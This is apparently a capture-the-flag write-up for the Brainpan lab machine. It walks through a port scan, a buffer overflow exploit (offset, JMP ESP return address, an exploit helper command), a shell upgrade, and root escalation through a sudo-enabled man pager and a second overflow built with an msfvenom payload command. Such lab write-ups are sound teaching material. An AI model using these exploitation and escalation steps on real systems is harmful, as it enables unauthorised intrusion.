Brainpan

## Scanning
```
PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 63
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
```
**Port 10000**
- Web server
- Has a nice info graphic about common vulnerabilities and their distribution across the ecosystem (Hint?)
- We find a */bin* directory that gives us access to the program running under port 9999

![3313118a4cacd5eec8b0fa2bc14ed5ff.png](../../_resources/b76ed8ce343c4f79b9d0a2be624c6f29.png)

## Exploitation

- We seem to have an exploitable binary:

![100cc5d0fc42933438b48e3c2aefb543.png](../../_resources/67dfd6bd8a6e4377bff270116350e655.png)

- Overflow with 700 bytes  
- **Offset: 524**
- Problem:
	- Stack adresses contain \x00 byte
	![f07b82621124af96796e2236074eab6d.png](../../_resources/305ae609a637421ea55338d5b812b16b.png)
- Solution:
	- Find a JMP ESP in the code
	- (Here I finally reverted back to Immunity because I was annoyed by WineDBG. The challenge states you should debug the exe on Unix buuuut whatever)
	- In the main function we find an instruction:
	- ![0e2a09e270b62ccaa3b057aeb7236b1a.png](../../_resources/0888f421c40e4e418a2f3c782c07db8e.png)
- This yields our **return address: F3121731**
- Final command call:
```
python ../../tools/buffer_overflow/overflow_helper.py exploit IP 9999 
-o 524 
-r "F3121731" 
--overflow-char "90" 
--padding 30 
--payload "SHELL_CODE"
```
- Aaand here we are:
![8038a0a7e15fe1810023b7194b981d14.png](../../_resources/08688862611344f9bfc1745a534bf333.png)

## Post Exploitation

- We actually are in a linux environment
- There is a shell script for restarting the brainpan.exe and it belongs to root
	- Unfortunately, the cron job itself is triggered by puck
- We upgrade our shell:
```
TERM="xterm"
export TERM
python -c "import pty;pty.spawn('/bin/bash');"
```
![4085b3a9dd422d41f902821622d0196b.png](../../_resources/9935348f3c1948f19536a64030e51cbf.png)

- Running `sudo -l` reveals us that there is a program we might run as root without a password prompt:
	![9dffeeebc4a14164d23ca0fdf369ae7a.png](../../_resources/00ba36469d7d4d2b894c72c21ec9dfe3.png)
![0a691aad5d07138462758f6c1ee1b6a6.png](../../_resources/c9bc5e455d9f41d0ae094222b77a88e2.png)


#### Path 1
- The `manual` command is interesting. If we play around with it, we see that it actually calls `man` on the following input. 
- With [this](https://gtfobins.github.io/gtfobins/man/) we can escalate to root
![5d188a86a875567808ba081ac633266a.png](../../_resources/60d6376e9f9441798d822b8136037ce3.png)

#### Path 2

- After enumerating the system (using linenum.sh here), we find an interesting file:
	![4cf369691a52ef9aff583e34eb3ddc61.png](../../_resources/df01021d96184958995124ae68c0abb2.png)
	- Seems to do only one thing: Checking if the byte \x46 (F) is present, and if so, returns false
	- If we could exploit it, we would get access to the anansi user
	- Checking it out, it seems vulnerable for yet another overflow exploit:
	![b5636afb2e2a3b7d710c6eae3ab5f0b7.png](../../_resources/4f9f797c119a4310aa06767cb452dd92.png)
	- **Offset: 116**
	- The stack addresses change on every program call, so we cannot provide a static return address to the stack --> ASLR
	- Or simply brute force it with a lot of NOPs?
		- That does not work well. It seems that only the two least significant positions are steady, yielding us with ~16 million possible addresses in between. We can only insert NOPs in the range of 100000s before the program crashes
	- However, our input is written into the eax register:
	![7e33acd4e4353ed7674db9370f4d8176.png](../../_resources/c6dd1afac046450383745d97654a707b.png)
	- We simply need to find a `call eax` instruction in the code:
	![d3484ce8fbfd887eee103b49b23b16f4.png](../../_resources/84d421a37a7c480e8fc85b99da2d8863.png)
	- After finding out the badchars we can generate a shell code (`msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x0a\x09\x20\x46'`) and exploit the binary:
![079bf67482e23c49bbfe554807aac19d.png](../../_resources/13fd02fd5a904348aa27645377253693.png)
	- Now we have write permissions on the sudo-enabled file, allowing us to replace this file with a bash: 
![426f08214c072d7dd600a9c946b08822.png](../../_resources/79c3c7919f794783ac28dff9da41e858.png)